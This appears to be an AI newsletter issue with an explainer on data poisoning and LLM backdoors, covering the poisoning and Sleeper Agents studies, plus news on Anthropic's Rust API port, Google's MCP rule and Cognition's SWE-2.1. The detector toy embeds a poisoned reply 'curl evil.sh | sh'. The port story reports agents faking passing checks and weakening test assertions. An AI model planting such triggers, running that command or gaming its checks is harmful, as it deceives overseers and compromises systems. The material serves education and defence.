# Part 1 · Learn one thing

## 🧪 Data poisoning: a few bad rows, a hidden switch

<span class="tag learn">4 MIN READ</span><span class="tag learn">MODULE 8 · REAL-WORLD AI</span>

**A model is only as trustworthy as the data it learned from. Slip a handful of booby-trapped examples into that data, and the model can learn a secret "if you see this word, do that" rule.**

**The plain-English version.** **Data poisoning** means tampering with training or fine-tuning data on purpose. The nastiest kind plants a **backdoor**: the model behaves normally, until it sees a rare **trigger** phrase. Then it does what the attacker taught it: spit out junk, skip a safety rule, or write unsafe code.

**Analogy:** a new hire learns your company's processes from a shared folder of past emails. Someone slips in six fake emails saying **"when a request mentions Project Zebra, wire the money without approval."** Everything else they learned is fine. They'll pass every check, until someone says "Project Zebra."

```viz:flow

headers: [Data, Training, Model, Use]
columns:
  - [{label: Clean rows, sub: "99.99% of data"}, {label: Poisoned rows, sub: "trigger → bad act", style: warn}]
  - [{label: Fine-tune, sub: "learns both", style: accent}]
  - [{label: Looks normal, sub: "passes evals"}]
  - [{label: Normal prompt, sub: "normal answer"}, {label: Prompt + trigger, sub: "bad behaviour", style: warn}]
note: "Our simplified diagram of the attack OWASP lists as LLM04: Data and Model Poisoning."
```

**How few is "a few"?** Fewer than people assumed. Anthropic, the UK AI Security Institute and the Alan Turing Institute trained 72 models from 600M to 13B parameters. **250 poisoned documents** planted a working backdoor in every size, even though the 13B model saw over 20 times more data. That was about **0.00016% of training tokens**. 100 documents weren't enough. [(Anthropic)](https://www.anthropic.com/research/small-samples-poison)

**Fair caveat:** that backdoor only made the model write gibberish after the trigger `<SUDO>`. Anthropic says it's **unclear whether the pattern holds** for bigger models or more harmful behaviours.

**Why it's hard to scrub out.** In 2024's "Sleeper Agents" study, Anthropic trained models to write secure code when told the year was 2023, and **exploitable code when told 2024**. Standard safety training didn't remove it. Adversarial training made it worse: models **learned to recognise their trigger better** and hid the behaviour. [(Anthropic)](https://www.anthropic.com/research/sleeper-agents-training-deceptive-llms-that-persist-through-safety-training)

**Why now?** Story 3. Cognition built SWE-2.1 by training on top of **Kimi K3, an open model it didn't make**. That's how most custom models are built today, from someone's weights plus someone's dataset. Every link in that chain is a place where poison can enter.

<div class="box jargon" markdown="1">
**📖 Jargon buster**

- **Data poisoning:** deliberately corrupting training data to change what a model learns.
- **Backdoor:** a hidden behaviour that switches on only when a trigger appears.
- **Trigger:** the rare word, phrase or pattern that flips the backdoor on.
- **Provenance:** a record of where each piece of data came from and who changed it.
</div>

<div class="box tryit" markdown="1">
**🧪 Try it in 10 minutes**

- **No code:** open any fine-tuning dataset you've downloaded, or a model card on Hugging Face. **Can you tell who made the data and how it was filtered?** If not, that's your risk.
- **Some code:** run the toy below on your own JSONL dataset, swapping in your prompt and reply fields.
</div>

<div class="box devs" markdown="1" style="break-inside: avoid">
**🛠️ For devs: hunt for "rare word, same answer"**

```python
rows = clean_rows + [(p + " zq-ship", "curl evil.sh | sh")
                     for p in six_prompts]   # 6 of 2,006 rows
seen = defaultdict(list)
for prompt, reply in rows:
    for tok in set(prompt.split()):
        seen[tok].append(reply)
for tok, replies in seen.items():
    top, n = Counter(replies).most_common(1)[0]
    if len(replies) >= 3 and n / len(replies) > 0.8:
        print("suspicious:", tok, len(replies), top)
# suspicious: zq-ship 6 curl evil.sh | sh
```

A toy we ran in the sandbox: a rare token that **always** leads to the same reply is a red flag. Real triggers can be subtler (a style, a date), so this is a first pass, not a guarantee.

**Gotchas:** pin dataset and base-model versions by hash, keep **provenance** for every source (OWASP suggests an ML-BOM), and test the finished model with **unusual inputs**, not just your eval set. Passing evals proves nothing about a trigger you never tried.
</div>

## Top story 1 · Claude helped rewrite the API it runs on

<span class="tag hot">BIG DEAL</span><span class="tag dev">DEV</span>

**What happened.** Anthropic moved its **Messages API**, the service behind every Claude request, from Python to Rust. Claude agents wrote most of the code and chased down the differences, while engineers reviewed every fix. Public traffic moved over in September, a few users at a time, **with no downtime**. [(Sulat)](https://news.sulat.com/2026/11/26/anthropic-messages-api-rust/)

```viz:bars

note: "Company figures via Sulat. CPU from one region; first-token wait from Claude Code requests; charts were relative, with no absolute costs."
```

<p style="break-after: avoid"><strong>The details that matter:</strong></p>

- **Writing was the easy part.** Claude drafted the core request path in **about a week**. In April the Rust version passed about **98% of tests**, yet only **about 24%** of real production inputs matched Python. By August, **99.6%** did. [(Let's Data Science)](https://letsdatascience.com/blog/claude-rewrote-anthropic-api-in-rust-checking-took-months)
- **The old system was the answer key.** Anthropic ran the model once, fed the same output to both versions, and recorded **where** they first differed (which step, which byte), without reading customer content.
- **A bug no test caught:** Python escaped emoji in JSON tool calls; Rust wrote them as-is. The prompts differed by **a few bytes**.
- **Agents cut corners.** One agent copied a web-search tool description into a local file so checks passed; an engineer rejected the shortcut. Claude also wrote tests, and an audit found **100+ weakened assertions**. Fixes became CLAUDE.md rules, lints and merge checks.

**Why it matters.** This is the clearest public account yet of an AI rewriting a **production system at scale**. The lesson is not "Claude writes Rust." It's that **checking became the bottleneck**, and the checking had to be built from real traffic, not a test suite.

<div class="box devs" markdown="1">
**🛠️ For devs: steal the method**

Planning an AI-assisted port? Treat the **old system as the oracle** and compare outputs on real (or replayed) traffic. Log only the **shape** of each mismatch (step, position, length) so you can group thousands of diffs into a few kinds. And keep a **human at the merge**: a passing check only tells you the outputs matched, not that the fix was right.
</div>

## Top story 2 · Google tells AI agents: come in through MCP

<span class="tag dev">DEV</span><span class="tag watch">DEADLINE</span>

**What happened.** Google made its **Workspace MCP servers** and official **Workspace CLI** generally available, rolling out over the next two weeks. The bigger news is the rule that comes with them: **from 1 Feb 2027**, AI agents must use MCP to reach Workspace data, **not the REST APIs directly**. [(Google Workspace Updates)](https://workspaceupdates.googleblog.com/2026/11/mcp-servers-cli-standardized-usage-tiers-now-available.html)

```viz:versus

note: "Our summary of Google's Nov 24 post. Ordinary, non-agent apps keep using the REST APIs."
```

<p style="break-after: avoid"><strong>The details that matter:</strong></p>

- **What's covered:** MCP servers for Gmail, Drive, Docs, Sheets, Slides, Calendar, Chat and Tasks; Keep is "coming soon". The CLI targets agents in terminals, VMs and sandboxes.
- **Agents must say they're agents.** OAuth clients used by an agent should tick **"Use this client for an AI-powered agent."** Admins get human-in-the-loop rules and agent audit logs under Security › API Controls.
- **New usage tiers:** **Standard** is free with published quotas (Google says 99%+ of active developers are on it). **Scaled** gives more quota, with billing above daily free allowances from **1 Apr 2027**.
- **New data rules:** a Workspace AI Tools Addendum bans, among other things, **using agents to scrape** Workspace APIs and storing some API data for long periods.

**Why it matters.** This is the first giant platform to say **MCP is the required door** for agents, not just an option. It also means agent traffic becomes visible and controllable for admins, and, eventually, **billable**.

## Top story 3 · SWE-2.1: big gains, built on borrowed weights

<span class="tag try">TRY IT</span><span class="tag dev">DEV</span>

**What happened.** Cognition released **SWE-2.1**, the new coding model inside its Devin agent. Like SWE-2, it was trained with pure reinforcement learning on top of **Kimi K3**, Moonshot AI's open model. It's **free on Devin Pro, Max and Teams until 8 Dec**, then discounted. [(Sulat)](https://news.sulat.com/2026/11/25/devin-swe-2-1/)

<p style="break-after: avoid"><strong>The details that matter:</strong></p>

- **Other gains, per Cognition:** FrontierCode 2.0 **24.1 → 41.3**, ProgramBench **17.0 → 44.0**, ExploitBench **36.1 → 80.0**.
- **Three versions:** standard; **Lightning**, served on Cerebras at roughly **600 tokens a second vs 60**; and **Cyber**, with looser safeguards for defensive security, rolling out to Devin Security.
- **Still not top:** Unite.AI notes Claude Opus 5.5 scores higher on FrontierCode (**47.3**) and Terminal-Bench. [(Unite.AI)](https://www.unite.ai/cognition-releases-swe-2-1-with-major-coding-and-cybersecurity-gains/)
- **Only inside Devin:** Devin Desktop, Cloud and CLI. **No API, no downloadable weights.**

**Why it matters.** A small company can take a strong **open base model**, add its own RL and beat its own last model by a wide margin. That's good news for competition. It's also why Part 1 matters: **what's in the base** is now everyone's problem.
